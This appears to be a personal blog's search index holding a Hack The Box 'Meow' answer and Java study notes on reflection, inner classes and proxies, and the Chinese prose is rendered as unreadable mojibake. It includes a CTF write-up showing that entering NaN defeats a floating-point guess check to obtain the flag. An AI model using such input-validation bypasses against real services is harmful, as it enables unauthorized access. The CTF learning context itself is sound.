<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hack The BOXè®°å½•</title>
      <link href="/posts/b0a65e80.html"/>
      <url>/posts/b0a65e80.html</url>
      
        <content type="html"><![CDATA[<h2 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h2><h3 id="Task1-What-does-the-acronym-VM-stand-for-ï¼ˆé¦–å­—æ¯ç¼©ç•¥è¯VMä»£è¡¨ä»€ä¹ˆï¼‰"><a href="#Task1-What-does-the-acronym-VM-stand-for-ï¼ˆé¦–å­—æ¯ç¼©ç•¥è¯VMä»£è¡¨ä»€ä¹ˆï¼‰" class="headerlink" title="Task1:What does the acronym VM stand for?ï¼ˆé¦–å­—æ¯ç¼©ç•¥è¯VMä»£è¡¨ä»€ä¹ˆï¼‰"></a>Task1:What does the acronym VM stand for?ï¼ˆé¦–å­—æ¯ç¼©ç•¥è¯VMä»£è¡¨ä»€ä¹ˆï¼‰</h3><p>virtual machine</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æœ‰å…³Javaçš„å°ç‚¹</title>
      <link href="/posts/b36bc80c.html"/>
      <url>/posts/b36bc80c.html</url>
      
        <content type="html"><![CDATA[<p>ç¢ç¢å¿µï¼šå­¦JavaçœŸçš„å¥½æŠ˜ç£¨äººå‘œå‘œå‘œå‘œï¼Œå¥½å¤šå¥½å¤šå¥½å¤šåŒ…ï¼Œåå­—ä¹Ÿä¸è®¤è¯†ï¼Œæ–¹æ³•ä¹Ÿä¸ä¼šç”¨ï¼Œåªèƒ½æ…¢æ…¢ä¸€æ­¥æ­¥å¾€å‰èµ°ï¼Œå“­å“­ğŸ˜­ï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯æ€»ç»“ä¸€äº›å…³äºJavaçš„æœ‰è¶£å°ç‚¹ï¼Œçœ‹ä¸ªä¹å‘µæ¶¨ç‚¹å†·çŸ¥è¯†å°±å¥½</p><span id="more"></span><h2 id="å…³äºæ•°å­—çš„ç±»å‹è½¬æ¢"><a href="#å…³äºæ•°å­—çš„ç±»å‹è½¬æ¢" class="headerlink" title="å…³äºæ•°å­—çš„ç±»å‹è½¬æ¢"></a>å…³äºæ•°å­—çš„ç±»å‹è½¬æ¢</h2><p>çœ‹åˆ°è¿™ä¸ªæ˜¯å› ä¸º2022ä¸­ç§‘å¤§çš„CTFæœ‰ä¸€é“çŒœæ•°å­—çš„é¢˜ç›®ï¼Œå…³é”®ä»£ç å¦‚ä¸‹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">XMLStreamException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">double</span> rand <span class="token operator">=</span> éšæœºæ•°ä¸€ä¸ª<span class="token punctuation">;</span>        <span class="token keyword">var</span> guess<span class="token operator">=</span><span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span><span class="token string">"ç”¨æˆ·è¾“å…¥çš„æ•°æ®"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> isLess <span class="token operator">=</span> rand <span class="token operator">&lt;</span> guess <span class="token operator">-</span> <span class="token number">1e-6</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> isMore <span class="token operator">=</span> rand <span class="token operator">></span> guess <span class="token operator">+</span> <span class="token number">1e-6</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>isLess<span class="token operator">&amp;&amp;</span><span class="token operator">!</span>isMore<span class="token operator">&amp;&amp;</span>ä¸€æ¬¡çŒœå¯¹<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token function">giveFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œä¼šéšæœºç”Ÿæˆä¸€ä¸ª0-1ä¹‹é—´çš„doubleç±»å‹çš„éšæœºæ•°ï¼Œç”¨æˆ·éœ€è¦çŒœå…¶ä¸­çš„éšæœºæ•°æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”åªè¦ä¸€æ¬¡çŒœå¯¹å°±ä¼šç»™flagï¼Œå½“ç„¶é™¤éä½ è¿æ°”å·²ç»å¥½åˆ°ä¸€å®šåœ°æ­¥äº†ä¸ç„¶ç»å¯¹ä¸å¯èƒ½çŒœå‡ºæ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¦è¾Ÿè¹Šå¾„äº†</p><p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·è¾“å…¥çš„æ•°æ®ç±»å‹æ˜¯ä»¥å­—ç¬¦ä¸²è¾“å…¥ç„¶åäº¤ç»™<code>parseDouble</code>å‡½æ•°è½¬æ¢æˆå°æ•°å†è¿›è¡Œåˆ¤æ–­çš„ï¼Œé‚£æˆ‘ä»¬è·Ÿå…¥<code>parseDouble</code>ä¸­çœ‹ä¸€ä¸‹è§£ææµç¨‹ï¼Œé€å±‚è°ƒç”¨åˆ°<code>FloatingDecimal.readJavaFormatString</code>å‡½æ•°ä¸­ï¼Œçœ‹åˆ°å¯¹ç‰¹æ®Šå†…å®¹çš„è§£æéƒ¨åˆ†</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210241949464.png"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸‰ç§ç‰¹æ®Šçš„è§£æç±»å‹ï¼Œåˆ†åˆ«æ˜¯NaNï¼ŒInfinityå’Œ16è¿›åˆ¶ï¼Œé‚£æˆ‘ä»¬åˆ†åˆ«ç”¨è¿™å‡ ç§è¯•è¯•çœ‹çœ‹æœ€ç»ˆæ•ˆæœ</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210242001054.png"></p><p>å¯ä»¥çœ‹åˆ°è¾“å…¥æ˜¯NaNå°±èƒ½æ‹¿åˆ°flagï¼Œæ˜¯å› ä¸ºNaNå°±åƒä¸€ä¸ªé»‘æ´ï¼Œä»»ä½•æ•°å­—å’Œä»–è¿›è¡Œè¿ç®—ç»“æœéƒ½æ˜¯NaNï¼ŒInfinityä¹Ÿç±»ä¼¼ï¼Œä¸è¿‡åœ¨*0çš„æ—¶å€™ä¼šå˜æˆNaNï¼Œåˆ¤æ–­ä¸­Infinityå¤§äºä»»ä½•æ•°ï¼Œè€ŒNaNè¡¨ç¤ºéæ•°å€¼ï¼Œæ‰€ä»¥ä¸ç®¡è¿›è¡Œä»€ä¹ˆè¿ç®—ç»“æœéƒ½ä¸ºNaNï¼Œå¸ƒå°”å€¼ä¸ºFalse</p><h2 id="å…³äºJavaä»£ç è°ƒç”¨çš„é—®é¢˜"><a href="#å…³äºJavaä»£ç è°ƒç”¨çš„é—®é¢˜" class="headerlink" title="å…³äºJavaä»£ç è°ƒç”¨çš„é—®é¢˜"></a>å…³äºJavaä»£ç è°ƒç”¨çš„é—®é¢˜</h2><p>Javaè¿™ä¸ªçƒ‚ç©æ„è®©äººå›°æƒ‘ä¸æ˜¯ä¸€å¤©ä¸¤å¤©äº†ï¼Œä»Šå¤©ç´¢æ€§æŠŠJavaä¸­çš„ä»£ç è°ƒç”¨é—®é¢˜ä¸€æ¬¡æ€§çœ‹å®Œï¼ˆè°ƒè¯•å®Œï¼‰</p><p>é¦–å…ˆæ˜¯staticå…³é”®å­—å®šä¹‰çš„ç±»ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨çš„æ—¶å€™éœ€è¦ç›´æ¥å®šä¹‰ï¼Œå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">className.staticInnerClass xxx&#x3D;new className.staticInnerClass()&#x2F;&#x2F;é™æ€å†…éƒ¨ç±»åªèƒ½è®¿é—®å¤–éƒ¨é™æ€å±æ€§æˆ–æ–¹æ³•<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæ˜¯ä¸€ä¸ªéé™æ€å­ç±»ï¼Œå°±éœ€è¦å…ˆå®ä¾‹åŒ–ä¸€ä¸ªçˆ¶ç±»ï¼Œå†å®ä¾‹åŒ–å­ç±»</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">className xxx &#x3D; new className();className.InnerClass inner  &#x3D; xxx.new InnerClass();&#x2F;&#x2F;æˆ–è€…ä¸€æ­¥åˆ°ä½className.InnerClass innerObject &#x3D; new className().new InnerClass();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>synchronized</code></p><h2 id="å…³äºåå°„"><a href="#å…³äºåå°„" class="headerlink" title="å…³äºåå°„"></a>å…³äºåå°„</h2><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬è¦è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼Œæˆ–è€…è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å­—æ®µï¼Œé€šå¸¸ä¼šä¼ å…¥å¯¹è±¡å®ä¾‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// Main.java</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itranswarp<span class="token punctuation">.</span>learnjava<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">getFullName</span><span class="token punctuation">(</span><span class="token class-name">Person</span> p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> p<span class="token punctuation">.</span><span class="token function">getFirstName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> p<span class="token punctuation">.</span><span class="token function">getLastName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯ï¼Œå¦‚æœä¸èƒ½è·å¾—<code>Person</code>ç±»ï¼Œåªæœ‰ä¸€ä¸ª<code>Object</code>å®ä¾‹ï¼Œæ¯”å¦‚è¿™æ ·ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> <span class="token function">getFullName</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬å°è¯•å¼ºåˆ¶è½¬å‹ï¼Œå°†å…¶è½¬æ¢ä¸ºPersonå¯¹è±¡ï¼Œæˆ‘ä»¬å°±å‘ç°è¿™æ—¶è¿˜æ˜¯éœ€è¦å¼•å…¥åŸå§‹çš„ç±»å®šä¹‰æ‰èƒ½è½¬æ¢ï¼Œè€Œåå°„å°±æ˜¯ä¸ºäº†é¿å…è¿™ç§æƒ…å†µçš„å‡ºç°</p><h3 id="å…³äºJavaç±»å‹"><a href="#å…³äºJavaç±»å‹" class="headerlink" title="å…³äºJavaç±»å‹"></a>å…³äºJavaç±»å‹</h3><blockquote><p>å¯¹äºJavaæ¥è¯´é™¤äº†intä¹‹ç±»çš„åŸºæœ¬ç±»å‹ä¹‹å¤–ï¼ŒJavaçš„å…¶ä»–ç±»å‹å…¨éƒ½æ˜¯<code>class</code>ç±»å‹</p><p>é‚£å¯¹äºä¸åŒçš„æ•°æ®ç±»å‹ä¹‹é—´ï¼Œç”±äºä¸­é—´æ²¡æœ‰ç»§æ‰¿å…³ç³»ï¼Œæ‰€ä»¥äº’ç›¸æ— æ³•è¿›è¡Œèµ‹å€¼</p><p>è€Œ<code>class</code>æ˜¯ç”±JVMåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­åŠ¨æ€åŠ è½½çš„ã€‚JVMåœ¨ç¬¬ä¸€æ¬¡è¯»å–åˆ°ä¸€ç§<code>class</code>ç±»å‹æ—¶ï¼Œå°†å…¶åŠ è½½è¿›å†…å­˜ã€‚</p><p>æ¯åŠ è½½ä¸€ç§<code>class</code>ï¼ŒJVMå°±ä¸ºå…¶åˆ›å»ºä¸€ä¸ª<code>Class</code>ç±»å‹çš„å®ä¾‹ï¼Œå¹¶å…³è”èµ·æ¥ã€‚æ³¨æ„ï¼šè¿™é‡Œçš„<code>Class</code>ç±»å‹æ˜¯ä¸€ä¸ªåå«<code>Class</code>çš„<code>class</code>ã€‚å®ƒé•¿è¿™æ ·ï¼š</p><pre class="line-numbers language-none"><code class="language-none">public final class Class &#123;    private Class() &#123;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä»¥<code>String</code>ç±»ä¸ºä¾‹ï¼Œå½“JVMåŠ è½½<code>String</code>ç±»æ—¶ï¼Œå®ƒé¦–å…ˆè¯»å–<code>String.class</code>æ–‡ä»¶åˆ°å†…å­˜ï¼Œç„¶åï¼Œä¸º<code>String</code>ç±»åˆ›å»ºä¸€ä¸ª<code>Class</code>å®ä¾‹å¹¶å…³è”èµ·æ¥ï¼š</p><pre class="line-numbers language-none"><code class="language-none">Class cls &#x3D; new Class(String);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ª<code>Class</code>å®ä¾‹æ˜¯JVMå†…éƒ¨åˆ›å»ºçš„ï¼Œå¦‚æœæˆ‘ä»¬æŸ¥çœ‹JDKæºç ï¼Œå¯ä»¥å‘ç°<code>Class</code>ç±»çš„æ„é€ æ–¹æ³•æ˜¯<code>private</code>ï¼Œåªæœ‰JVMèƒ½åˆ›å»º<code>Class</code>å®ä¾‹ï¼Œæˆ‘ä»¬è‡ªå·±çš„Javaç¨‹åºæ˜¯æ— æ³•åˆ›å»º<code>Class</code>å®ä¾‹çš„ã€‚</p><p>æ‰€ä»¥ï¼ŒJVMæŒæœ‰çš„æ¯ä¸ª<code>Class</code>å®ä¾‹éƒ½æŒ‡å‘ä¸€ä¸ªæ•°æ®ç±»å‹ï¼ˆ<code>class</code>æˆ–<code>interface</code>ï¼‰ï¼š</p><pre class="line-numbers language-ascii" data-language="ascii"><code class="language-ascii">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚      Class Instance       â”‚â”€â”€â”€â”€â”€â”€&gt; Stringâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚name &#x3D; &quot;java.lang.String&quot;  â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚      Class Instance       â”‚â”€â”€â”€â”€â”€â”€&gt; Randomâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚name &#x3D; &quot;java.util.Random&quot;  â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚      Class Instance       â”‚â”€â”€â”€â”€â”€â”€&gt; Runnableâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚name &#x3D; &quot;java.lang.Runnable&quot;â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€ä¸ª<code>Class</code>å®ä¾‹åŒ…å«äº†è¯¥<code>class</code>çš„æ‰€æœ‰å®Œæ•´ä¿¡æ¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚      Class Instance       â”‚â”€â”€â”€â”€â”€â”€&gt; Stringâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚name &#x3D; &quot;java.lang.String&quot;  â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚package &#x3D; &quot;java.lang&quot;      â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚super &#x3D; &quot;java.lang.Object&quot; â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚interface &#x3D; CharSequence...â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚field &#x3D; value[],hash,...   â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚method &#x3D; indexOf()...      â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äºJVMä¸ºæ¯ä¸ªåŠ è½½çš„<code>class</code>åˆ›å»ºäº†å¯¹åº”çš„<code>Class</code>å®ä¾‹ï¼Œå¹¶åœ¨å®ä¾‹ä¸­ä¿å­˜äº†è¯¥<code>class</code>çš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»åã€åŒ…åã€çˆ¶ç±»ã€å®ç°çš„æ¥å£ã€æ‰€æœ‰æ–¹æ³•ã€å­—æ®µç­‰ï¼Œå› æ­¤ï¼Œå¦‚æœè·å–äº†æŸä¸ª<code>Class</code>å®ä¾‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ª<code>Class</code>å®ä¾‹è·å–åˆ°è¯¥å®ä¾‹å¯¹åº”çš„<code>class</code>çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><p>è¿™ç§é€šè¿‡<code>Class</code>å®ä¾‹è·å–<code>class</code>ä¿¡æ¯çš„æ–¹æ³•ç§°ä¸ºåå°„ï¼ˆReflectionï¼‰ã€‚</p></blockquote><p>ä»¥ä¸Šå†…å®¹æ¥è‡ªå»–é›ªå³°è€å¸ˆçš„Javaæ•™ç¨‹ï¼Œå†™çš„çœŸçš„å¾ˆä¸é”™ï¼Œä¸‹é¢æ¥å†™ä¸€äº›å¸®åŠ©æˆ‘è‡ªå·±ç†è§£çš„å†…å®¹</p><p>é¦–å…ˆå°±æ˜¯åå°„å¯ä»¥åœ¨javaä¸­æ‰§è¡Œçš„æ ¹æœ¬åŸå› ï¼Œå°±æ˜¯Javaä¼šä¸ºåœ¨åŠ è½½æŸä¸ªç±»çš„æ—¶å€™æŠŠç±»æœ‰å…³çš„ä¿¡æ¯å­˜å‚¨èµ·æ¥ï¼Œå¹¶ä¸”è¿™éƒ¨åˆ†å°±ç›¸å½“äºæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„è®¿é—®åˆ°å…¶ä¸­çš„å†…å®¹ï¼Œä¹Ÿå°±è¾¾æˆäº†è·å–å…¶ä¸­çš„å±æ€§å’Œæ–¹æ³•çš„ç›®çš„ï¼Œåˆå› ä¸ºjavaæ•°æ®éƒ½æ˜¯é€šè¿‡å­—èŠ‚ç å­˜å‚¨çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æŒ‰ç…§å­—èŠ‚ç çš„ç”Ÿæˆè§„åˆ™å¯¹ç›¸åº”çš„ä½ç½®çš„å­—èŠ‚ç è¿›è¡Œä¿®æ”¹å°±èƒ½è¾¾åˆ°ä¿®æ”¹å†…å®¹çš„ç›®çš„ï¼Œå¹¶ä¸”è¿˜ä¸ä¼šå¯¼è‡´å¯¹åº”ç±»çš„å…³è”æ–¹æ³•è§¦å‘ï¼Œè¿™ä¹Ÿæ˜¯åé¢ysoåºåˆ—åŒ–é“¾å¯¹åå°„å¤§é‡ä½¿ç”¨çš„åŸå› ï¼ˆé˜²æ­¢é“¾å­ç”Ÿæˆçš„æ—¶å€™å­—èŠ‚ç å°±è¢«æ‰§è¡Œï¼‰</p><blockquote><p>å¦‚ä½•è·å–ä¸€ä¸ª<code>class</code>çš„<code>Class</code>å®ä¾‹ï¼Ÿæœ‰ä¸‰ä¸ªæ–¹æ³•ï¼š</p><p>æ–¹æ³•ä¸€ï¼šç›´æ¥é€šè¿‡ä¸€ä¸ª<code>class</code>çš„é™æ€å˜é‡<code>class</code>è·å–ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> cls <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ–¹æ³•äºŒï¼šå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªå®ä¾‹å˜é‡ï¼Œå¯ä»¥é€šè¿‡è¯¥å®ä¾‹å˜é‡æä¾›çš„<code>getClass()</code>æ–¹æ³•è·å–ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">"Hello"</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cls <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ–¹æ³•ä¸‰ï¼šå¦‚æœçŸ¥é“ä¸€ä¸ª<code>class</code>çš„å®Œæ•´ç±»åï¼Œå¯ä»¥é€šè¿‡é™æ€æ–¹æ³•<code>Class.forName()</code>è·å–ï¼š</p><pre class="line-numbers language-none"><code class="language-none">Class cls &#x3D; Class.forName(&quot;java.lang.String&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å› ä¸º<code>Class</code>å®ä¾‹åœ¨JVMä¸­æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥ï¼Œä¸Šè¿°æ–¹æ³•è·å–çš„<code>Class</code>å®ä¾‹æ˜¯åŒä¸€ä¸ªå®ä¾‹ã€‚å¯ä»¥ç”¨<code>==</code>æ¯”è¾ƒä¸¤ä¸ª<code>Class</code>å®ä¾‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">Class cls1 &#x3D; String.class;String s &#x3D; &quot;Hello&quot;;Class cls2 &#x3D; s.getClass();boolean sameClass &#x3D; cls1 &#x3D;&#x3D; cls2; &#x2F;&#x2F; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ä¸€ä¸‹<code>Class</code>å®ä¾‹æ¯”è¾ƒå’Œ<code>instanceof</code>çš„å·®åˆ«ï¼š</p><pre class="line-numbers language-none"><code class="language-none">Integer n &#x3D; new Integer(123);boolean b1 &#x3D; n instanceof Integer; &#x2F;&#x2F; trueï¼Œå› ä¸ºnæ˜¯Integerç±»å‹boolean b2 &#x3D; n instanceof Number; &#x2F;&#x2F; trueï¼Œå› ä¸ºnæ˜¯Numberç±»å‹çš„å­ç±»boolean b3 &#x3D; n.getClass() &#x3D;&#x3D; Integer.class; &#x2F;&#x2F; trueï¼Œå› ä¸ºn.getClass()è¿”å›Integer.classboolean b4 &#x3D; n.getClass() &#x3D;&#x3D; Number.class; &#x2F;&#x2F; falseï¼Œå› ä¸ºInteger.class!&#x3D;Number.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”¨<code>instanceof</code>ä¸ä½†åŒ¹é…æŒ‡å®šç±»å‹ï¼Œè¿˜åŒ¹é…æŒ‡å®šç±»å‹çš„å­ç±»ã€‚è€Œç”¨<code>==</code>åˆ¤æ–­<code>class</code>å®ä¾‹å¯ä»¥ç²¾ç¡®åœ°åˆ¤æ–­æ•°æ®ç±»å‹ï¼Œä½†ä¸èƒ½ä½œå­ç±»å‹æ¯”è¾ƒã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”è¯¥ç”¨<code>instanceof</code>åˆ¤æ–­æ•°æ®ç±»å‹ï¼Œå› ä¸ºé¢å‘æŠ½è±¡ç¼–ç¨‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸å…³å¿ƒå…·ä½“çš„å­ç±»å‹ã€‚åªæœ‰åœ¨éœ€è¦ç²¾ç¡®åˆ¤æ–­ä¸€ä¸ªç±»å‹æ˜¯ä¸æ˜¯æŸä¸ª<code>class</code>çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ‰ä½¿ç”¨<code>==</code>åˆ¤æ–­<code>class</code>å®ä¾‹ã€‚</p><p>å› ä¸ºåå°„çš„ç›®çš„æ˜¯ä¸ºäº†è·å¾—æŸä¸ªå®ä¾‹çš„ä¿¡æ¯ã€‚å› æ­¤ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ°æŸä¸ª<code>Object</code>å®ä¾‹æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„è·å–è¯¥<code>Object</code>çš„<code>class</code>ä¿¡æ¯ï¼š</p></blockquote><h2 id="å…³äºä»£ç†"><a href="#å…³äºä»£ç†" class="headerlink" title="å…³äºä»£ç†"></a>å…³äºä»£ç†</h2><p>ä»£ç†ç±»æ˜¯éå¸¸æœ‰æ„æ€çš„ä¸œè¥¿</p><p><em><strong>åŠ¨æ€ä»£ç†</strong></em></p><p>æˆ‘ä»¬åœ¨æ­£å¸¸ä½¿ç”¨æ¥å£çš„æ—¶å€™éƒ½æ˜¯å…ˆç¼–å†™ä¸€ä¸ªå¯¹åº”çš„å®ç°ç±»ï¼Œç„¶åå†ç¼–å†™å¯¹åº”çš„æ–¹æ³•ï¼Œä½†æ˜¯é€šè¿‡ä»£ç†ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸å®ç°æ¥å£çš„å‰æä¸‹ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸ºå…¶æ·»åŠ å¯¹åº”çš„æ–¹æ³•</p><p>ä¸Šé¢è¿™ä¸ªè¿‡ç¨‹ä¸»è¦é€šè¿‡<code>handler</code>å®ç°</p><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å¯¹äºåŒæ ·çš„åŠŸèƒ½æˆ‘ä»¬ä¼ 